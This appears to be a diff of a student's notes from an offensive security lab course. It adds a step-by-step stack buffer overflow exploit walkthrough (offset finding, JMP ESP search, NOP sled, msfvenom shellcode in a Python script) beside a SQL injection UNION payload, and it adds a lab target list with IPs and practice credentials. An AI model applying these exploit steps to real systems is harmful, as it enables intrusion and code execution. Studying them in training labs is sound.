@@ -248,6 +248,84 @@ Step 1: Identify vulnerable field
 
         .php?Selection=<option> UNION SELECT @@version,pass,name FROM session.user #
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Exploit Development Notes:
+
+verify it is exicutable (if cant chmod or make exicutable than move to /tmp) chmod u+x <>
+run the exicutable see what is does
+run strings <fucnction>
+gdb <functions>
+info functions (in gdb)
+pdisass main
+pdisass <function call>
+look for unsecure c code
+exit to shell or just out shell
+vim or nano linbuff.py ()
+```
+#!/usr/bin/env python
+
+offset = "A" * 100
+
+print (offset)
+```
+python linbuff.py | ./func (should crash it: Segmentation fault (core dumped))
+gdb ./func
+do run <<<$(python linbuff.py) (look what is overwritten) should see 0x41414141 in ?? ()
+quit and use wiremask.eu and make a pattern and put that in the script you made
+nano linbuf go back to the "A" * the number you got from wiremask
+```
+#!/usr/bin/env python
+
+offset = "A" * 62
+test = "BBBB"
+
+print(offset + test)
+```
+run <<<$(python linbuff.py) should get 0x42424242
+env - gbd ./func
+show env
+unset env LINES
+unset env COLUMNS
+run
+^C
+info proc map
+see [heap] and [stack] on same screen and choose data from between
+find /b <first address after heap>, <last address before stack>, 0xff, 0xe4
+top esp location and paste into script bellow test
+nano linbuff.py
+```
+#!/usr/bin/env python
+
+offset = "A" * 62
+#test = "BBBB"
+#<0xf7de3b59>
+
+eip = \x59\x3b\xde\xf7
+
+nop = "\x90" * 15
+
+print(offset + eip + nop)
+```
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
+take the output and copy it to linbuff bellow nop and add buf
+```
+#!/usr/bin/env python
+
+offset = "A" * 62
+#test = "BBBB"
+#<0xf7de3b59>
+
+eip = \x59\x3b\xde\xf7
+
+nop = "\x90" * 15
+
+<large buf text>
+
+print(offset + eip + nop + buf)
+```
+run python linbuff.py | ./func and should get student
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 lpid - is a table in the column
 permissions - is the column
 sqlinjection - is the schema
@@ -606,7 +684,63 @@ Question 12:
 
 Question 13:
 	
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Scheme of Maneuver:
+
+>Jump Box
+->T1: 192.168.28.111
+->T2: 192.168.150.245
+->T3: 192.168.28.105
 
 
+Target Section:
 
+T1
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+
+T2
+Hostname: unknown
+IP: 192.168.150.245
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Exploit a network service on the machine.
+
+T3
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: unknown
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+
+Question 1:
+	
+
+Question 2:
+	
+
+Question 3:
+	
+
+Question 4:
+	
+
+Question 5:
+	
+
+Question 6:
+	
+
+Question 7:
+	
+
+Question 8:
+	
 
